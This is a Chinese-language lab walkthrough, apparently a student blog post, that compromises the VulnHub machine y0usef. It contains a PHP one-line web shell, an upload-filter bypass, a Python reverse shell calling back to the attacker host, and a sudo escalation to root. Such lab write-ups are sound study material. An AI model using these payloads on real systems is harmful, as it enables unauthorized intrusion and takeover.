+  <entry>
+    <title>【渗透测试】第一周 vulnhub-y0usef</title>
+    <url>/vulnhub-y0usef/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><blockquote>
+<p>第一周</p>
+<p>可弟WZ</p>
+<p>主页：blog.kekwy.com</p>
+<p>邮箱：<a href="mailto:&#x6b;&#x65;&#x65;&#x6b;&#107;&#101;&#x77;&#121;&#64;&#x71;&#x71;&#46;&#x63;&#111;&#x6d;">&#x6b;&#x65;&#x65;&#x6b;&#107;&#101;&#x77;&#121;&#64;&#x71;&#x71;&#46;&#x63;&#111;&#x6d;</a></p>
+<p>2022年9月27日</p>
+</blockquote>
+<h2 id="一、实验准备"><a href="#一、实验准备" class="headerlink" title="一、实验准备"></a>一、实验准备</h2><p>靶机：y0usef</p>
+<p>下载链接：<a href="https://www.vulnhub.com/entry/y0usef-1,624/">https://www.vulnhub.com/entry/y0usef-1,624/</a></p>
+<p>攻击机：kali</p>
+<h2 id="二、实验目标"><a href="#二、实验目标" class="headerlink" title="二、实验目标"></a>二、实验目标</h2><p>取得目标靶机的root权限和2个flag。</p>
+<h2 id="三、实验内容"><a href="#三、实验内容" class="headerlink" title="三、实验内容"></a>三、实验内容</h2><ol>
+<li><p>在VirtualBox中同时启动kali攻击机和第三周靶机，并保证两者位于同一局域网下。</p>
+</li>
+<li><p>在kali中执行以下指令进行局域网主机发现：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo arp-scan -I eth0 -l</span></span><br></pre></td></tr></table></figure>
+
+<p>扫描结果如下：</p>
+<p><img src="https://blog.kekwy.com/media/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220921103912013.png" alt="image-20220921103912013"> </p>
+<p>可以推断<sup>1</sup>出靶机 地址为 <code>10.0.2.5</code> 。</p>
+<p><a id="jump1"></a></p>
+<p><code>1：</code> 推断方式很多，可以挨个扫描端口，可以控制变量（不开靶机扫描一次，启动靶机后再扫描一次），可以对比扫描结果与靶机的mac地址，也可以是经验之谈。</p>
+</li>
+<li><p>在kali中执行以下指令扫描靶机的端口状态：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo nmap -p- 10.0.2.5</span></span><br></pre></td></tr></table></figure>
+
+<p>扫描结果如下：</p>
+<p><img src="https://blog.kekwy.com/media/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220921083225282.png" alt="image-20220921083225282"> </p>
+<p>发现开通了22、80两个端口，提示我们可以考虑靶机上的<code>ssh</code>与<code>http</code>服务。为了进一步确定各端口的用途，我们可以通过以下指令<sup>2</sup>获取对应的服务版本信息：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo nmap -p22,80 -sV -sC 10.0.2.5</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p><a id="jump2"></a></p>
+<p><code>2:</code> <code>-p</code> 对指定端口扫描</p>
+<p>​	    <code>-sV -sC</code> 默认安全脚本扫描</p>
+<p>扫描结果如下：</p>
+<p><img src="https://blog.kekwy.com/media/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220921111148084.png" alt="image-20220921111148084"> </p>
+</li>
+<li><p>我们根据靶机开放的80端口，推测可以去网页上寻找突破口。于是在kali中打开浏览器，并输入靶机的IP，进入在靶机上运行的网站，顺便查看网站的源码：</p>
+<p><img src="https://blog.kekwy.com/media/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220921111747118.png" alt="image-20220921111747118"> </p>
+<p> 但是发现网站与其源码中均无对我们有帮助的信息，再尝试能否查看靶机上的<code>robots.txt</code>文件<sup>3</sup>：</p>
+<img src="https://blog.kekwy.com/media/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220921112049063.png" alt="image-20220921112049063" style="zoom:67%;" /> 
+
+<p>但令人遗憾的是，我们并不能查看该文件。</p>
+<p><a id="jump3"></a></p>
+<p><code>3:</code> Robots协议（也称为爬虫协议、机器人协议等）的全称是“网络爬虫排除标准”（Robots Exclusion Protocol），网站通过Robots协议告诉搜索引擎哪些页面可以抓取，哪些页面不能抓取。obots.txt文件是一个文本文件。robots.txt是搜索引擎中访问网站的时候要查看的第一个文件。robots.txt文件告诉网络爬虫在服务器上什么文件是可以被查看的。</p>
+</li>
+<li><p>使用whatweb工具查看web应用所采用的软件构架：</p>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ whatweb http://10.0.2.5</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog.kekwy.com/media/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220921151941056.png" alt="image-20220921151941056"> </p>
+<p>尝试使用工具<code>dirsearch</code>爆破 web 服务端的路径，发现一些隐藏的路径和文件：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">dirsearch -u http://10.0.2.5</span></span><br></pre></td></tr></table></figure>
+
+<p>结果如下：</p>
+<img src="https://blog.kekwy.com/media/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220921091507301.png" alt="image-20220921091507301" style="zoom: 50%;" /> 
+
+<p>得知<sup>4</sup>服务器上有三个我们可以访问的文件：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/adminstration</span><br><span class="line">/index.php</span><br><span class="line">/index.php/login</span><br></pre></td></tr></table></figure>
+
+<p>其中，通过后两个文件的url进入服务器后的页面与此前相同，仍无有价值信息。</p>
+<p><a id="jump4"></a></p>
+<p><code>4:</code> HTTP的状态码可分为五大类：1xx-临时响应、2xx-成功、3xx-重定向、4xx-请求错误、5xx-服务器错误。</p>
+<p>上述结果中出现的状态码的含义分别为：</p>
+<table>
+<thead>
+<tr>
+<th>状态码</th>
+<th>含义</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>403</td>
+<td>(禁止)服务器拒绝请求。</td>
+</tr>
+<tr>
+<td>301</td>
+<td>(永久移动)请求的网页已永久移动到新位置。服务器返回此响应(对 GET 或 HEAD 请求的响应)时，会自动将请求者转到新位置。</td>
+</tr>
+<tr>
+<td>200</td>
+<td>(成功)服务器已成功处理了请求。通常，这表示服务器提供了请求的网页。</td>
+</tr>
+</tbody></table>
+</li>
+<li><p>访问<code>10.0.2.5/adminstration</code>：</p>
+<p><img src="https://blog.kekwy.com/media/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220921114137208.png" alt="image-20220921114137208"> </p>
+<p>提示我们没有权限，需要进行“绕过”。这里我们采用“X系列头部绕过”的方式：</p>
+<p>启动Burp Suit并启用拦截，将浏览器代理设置为<code>127.0.0.1:8080</code>（Burp Suit的默认代理端口为8080）。</p>
+<p>刷新页面，Burp Suit弹出拦截窗口，在被拦截的数据包中加入<code>X-Forwarded-For: 127.0.0.1</code><sup>5</sup>（如下图），再将其发送。<em><strong>【后续被拦截的数据包都需要插入上述内容。】</strong></em></p>
+<p><img src="https://blog.kekwy.com/media/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220921124711969.png" alt="image-20220921124711969"> </p>
+<p>发现成功进入一个登录界面：</p>
+<p><img src="https://blog.kekwy.com/media/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220921124805448.png" alt="image-20220921124805448"> </p>
+<p>这里我们可以直接尝试一下弱口令，用户名和密码都输入admin，发现登入成功了。</p>
+<p><img src="https://blog.kekwy.com/media/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220921130249392.png" alt="image-20220921130249392">  </p>
+<p><a id="jump5"></a></p>
+<p><code>5</code>: 让靶机服务器误以为该报文是从其本地发起的，从而获取访问权限。</p>
+</li>
+<li><p>简单浏览了各个页面之后，发现没有什么直接可用的信息，但是这里的文件上传功能引起了我们的注意。</p>
+<p>首先编写一个“一句话木马”的PHP 文件<code>shell.php</code>，内容如下：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="variable">$var</span>=<span class="title function_ invoke__">shell_exec</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]); <span class="keyword">echo</span> <span class="variable">$var</span><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>尝试直接将其上传，发现网站提示文件被拒绝：</p>
+<p><img src="https://blog.kekwy.com/media/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220921130902640.png" alt="image-20220921130902640"> </p>
+<p>推测网站可能存在针对文件类型的过滤<sup>6</sup>，我们可以通过修改被拦截的报文中<code>Content-Type</code>字段的值进行绕过：</p>
+<p><img src="https://blog.kekwy.com/media/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220921131442789.png" alt="image-20220921131442789"> </p>
+<p>修改为：<code>image/png</code>：</p>
+<p><img src="https://blog.kekwy.com/media/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220921131518489.png" alt="image-20220921131518489"> </p>
+<p>文件上传成功了，并提供了上传完成的文件的URL。</p>
+<p><img src="https://blog.kekwy.com/media/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220921131734558.png" alt="image-20220921131734558"> </p>
+<p><a id="jump6"></a></p>
+<p><code>6:</code> 常见的过滤形式与绕过方法：</p>
+<ol>
+<li>针对文件扩展名的绕过：</li>
+</ol>
+<p>修改文件扩展名后，再上传。</p>
+<p>2)针对文件类型的绕过：</p>
+<p>修改报文中的<code>Content-Type</code>字段（如本次实验）。</p>
+<p>3)针对文件内容的绕过：</p>
+<p>在文件内容的前面添加上符合文件类型要求的数据，中间穿插我们的代码。</p>
+</li>
+<li><p>通过URL访问文件：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://10.0.2.5/adminstration/upload/files/1663725708shell.php</span><br></pre></td></tr></table></figure>
+
+<p>进入了一片空白的页面，说明该url正确。再尝试输入指令，测试代码是否可以正常运行：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://10.0.2.5/adminstration/upload/files/1663725708shell.php?cmd=ls</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog.kekwy.com/media/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220921133834453.png" alt="image-20220921133834453"> </p>
+<p>指令成功运行，到此为止我们就可以通过url让目标靶机执行反弹shell的代码了。首先，先试探一下靶机的语言环境：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://10.0.2.5/adminstration/upload/files/1663725708shell.php?cmd=which python</span><br></pre></td></tr></table></figure>
+
+<p>得到了靶机上的python路径，说明靶机有python环境：</p>
+<p><img src="https://blog.kekwy.com/media/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220921134349689.png" alt="image-20220921134349689"> </p>
+<p>故我们可以利用python版的反弹shell代码实现反弹shell，首先在kali上监听某一个端口（如4444端口）：</p>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ nc -nvlp 4444</span><br></pre></td></tr></table></figure>
+
+<p>修改对应的python代码：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;ip&quot;,port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>其中ip修改为kali的ip，port修改为刚才设置监听的端口。本次实验中分别为10.0.2.15、4444.</p>
+<p>将修改好的代码插入上述URL中对应的参数位置（”cmd&#x3D;”之后），再次访问，发现kali的shell成功监听到靶机的反弹shell：</p>
+<img src="https://blog.kekwy.com/media/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220921140145500.png" alt="image-20220921140145500" style="zoom:67%;" /> 
+
+<p>使用以下指令对反弹shell进行一个简单的升级: </p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">python -c <span class="string">&quot;import pty; pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span></span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog.kekwy.com/media/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220921140419911.png" alt="image-20220921140419911"> </p>
+</li>
+<li><p>查看&#x2F;etc&#x2F;passwd 文件<sup>7</sup>：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cat</span> /etc/passwd</span></span><br></pre></td></tr></table></figure>
+
+<p>注意到有以下一项：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yousef:x:1000:1000:yousef,,,:/home/yousef:/bin/bash</span><br></pre></td></tr></table></figure>
+
+<p>说明有一个叫<code>yousef</code>的用户可以登录系统<sup>8</sup>，且主目录为<code>/home/yousef</code>。</p>
+<p>进入该用户的主目录，发现文件user.txt。查看内容，发现第一个flag。</p>
+<p><a id="jump7"></a></p>
+<p><code>7</code>: 在Linux系统中的passwd文件中，每一行对应一个用户的一组信息，每项信息用冒号隔开：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">用户名 : 密码 : uid : gid : 用户描述 : 主目录 : 登录shell</span><br></pre></td></tr></table></figure>
+
+<p><a id="jump8"></a></p>
+<p><code>8</code>: 对于用户的登录shell：</p>
+<p><code>/bin/false</code> 是最严格的禁止login选项，一切服务都不能用，</p>
+<p><code>/bin/nologin</code> 只是不允许系统login，可以使用其他ftp等服务</p>
+<p>因此我们一眼就锁定了<code>yousef</code>用户（靶机passwd中的大部分用户都不能进行系统登录），而speech-dispatcher、guest-cpxNn2貌似也可以系统登录，但他们的用户名比较奇怪，不作为首选目标，当然也可以都去他们的主目录看一看，结果发现flag在yousef中，还是选择yousef作为突破口。</p>
+</li>
+<li><p>第一个flag经过base64解码后，得到yousef用户可用于ssh登录的用户名和密码。恰好我们一开始就得知靶机在开放端口22上提供了ssh服务，故我们可以尝试使用ssh登入yousef。</p>
+<p>退出反弹shell，在kali的shell使用以下指令：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">ssh yousef@10.0.2.5</span></span><br></pre></td></tr></table></figure>
+
+<img src="https://blog.kekwy.com/media/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220921142200653.png" alt="image-20220921142200653" style="zoom:67%;" /> 
+
+<p> 成功登入yousef后，查看该用户所在的用户组：</p>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">id</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog.kekwy.com/media/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220921142413525.png" alt="image-20220921142413525"> </p>
+<p>发现该用户属于sudo组，查看该用户可执行的指令：</p>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ sudo -l</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog.kekwy.com/media/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220921142645249.png" alt="image-20220921142645249"> </p>
+<p>发现该用户可以执行所有的系统指令，则我们可以直接切换为root身份：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo -i</span></span><br></pre></td></tr></table></figure>
+
+<p>查看root用户主目录下的文件，发现文件root.txt，查看并使用base64解码得到最后一个flag。</p>
+</li>
+<li><p>至此我们实现了root权限的提取，并成功获取了所有的两个flag。</p>
+</li>
+</ol>
+<p>【完结撒花】</p>
 ]]></content>
       <categories>
         <category>网络攻防实战</category>
